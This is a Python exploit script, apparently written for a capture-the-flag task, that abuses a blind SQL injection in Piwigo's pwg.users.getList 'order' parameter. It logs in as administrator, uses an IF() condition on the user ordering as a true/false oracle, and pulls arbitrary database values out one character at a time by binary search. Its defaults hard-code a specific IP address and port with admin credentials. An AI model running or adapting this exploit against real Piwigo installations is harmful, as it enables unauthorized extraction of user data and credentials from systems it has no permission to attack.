#!/usr/bin/env python3
"""Bounded Piwigo ORDER BY SQL-injection reproducer/extractor."""

from __future__ import annotations

import argparse
import http.cookiejar
import json
import urllib.error
import urllib.parse
import urllib.request


class PiwigoOracle:
    def __init__(self, base: str, username: str, password: str) -> None:
        self.base = base.rstrip("/")
        jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(jar)
        )
        self.headers = {
            "User-Agent": "ScopeGuard-CTF-Agent/0.1",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": f"{self.base}/admin.php?page=user_list",
        }
        self.login(username, password)

    @staticmethod
    def request(
        opener: urllib.request.OpenerDirector,
        url: str,
        data: dict[str, object] | None,
        headers: dict[str, str],
    ) -> tuple[int, bytes]:
        encoded = urllib.parse.urlencode(data).encode() if data else None
        request = urllib.request.Request(url, data=encoded, headers=headers)
        try:
            with opener.open(request, timeout=20) as response:
                return response.status, response.read()
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read()

    def login(self, username: str, password: str) -> None:
        url = f"{self.base}/identification.php"
        status, _ = self.request(
            self.opener,
            url,
            None,
            {"User-Agent": self.headers["User-Agent"]},
        )
        if status != 200:
            raise RuntimeError(f"login page returned {status}")

        status, body = self.request(
            self.opener,
            url,
            {
                "username": username,
                "password": password,
                "remember_me": "0",
                "redirect": "",
                "login": "Submit",
            },
            self.headers,
        )
        if status != 200 or b"Identification" in body:
            raise RuntimeError("Piwigo login failed")

    def oracle(self, condition: str) -> bool:
        order = f"IF(({condition}),id,-id)"
        status, body = self.request(
            self.opener,
            f"{self.base}/ws.php?format=json&method=pwg.users.getList",
            {"display": "all", "order": order},
            self.headers,
        )
        if status != 200:
            raise RuntimeError(f"oracle returned HTTP {status}")
        parsed = json.loads(body)
        users = parsed.get("result", {}).get("users", [])
        if len(users) < 2:
            raise RuntimeError(f"unexpected oracle result: {parsed}")
        return int(users[0]["id"]) == 1

    def extract_text(self, expression: str, max_length: int) -> str:
        length_low, length_high = 0, max_length
        while length_low < length_high:
            middle = (length_low + length_high) // 2
            condition = f"CHAR_LENGTH(COALESCE(({expression}),0x))>{middle}"
            if self.oracle(condition):
                length_low = middle + 1
            else:
                length_high = middle

        result = []
        for position in range(1, length_low + 1):
            result.append(chr(self._extract_ascii(expression, position)))
        return "".join(result)

    def _extract_ascii(
        self,
        expression: str,
        position: int,
    ) -> int:
        low, high = 0, 126
        while low < high:
            middle = (low + high) // 2
            condition = (
                f"ASCII(SUBSTR(({expression}),{position},1))>{middle}"
            )
            if self.oracle(condition):
                low = middle + 1
            else:
                high = middle
        return low


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://183.238.63.200:45712")
    parser.add_argument("--username", default="admin")
    parser.add_argument("--password", default="admin123456")
    parser.add_argument("--expression", required=True)
    parser.add_argument("--max-length", type=int, default=128)
    args = parser.parse_args()

    oracle = PiwigoOracle(args.base, args.username, args.password)
    baseline = oracle.oracle("1=1")
    print(f"boolean_oracle={baseline}")
    print(f"value={oracle.extract_text(args.expression, args.max_length)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
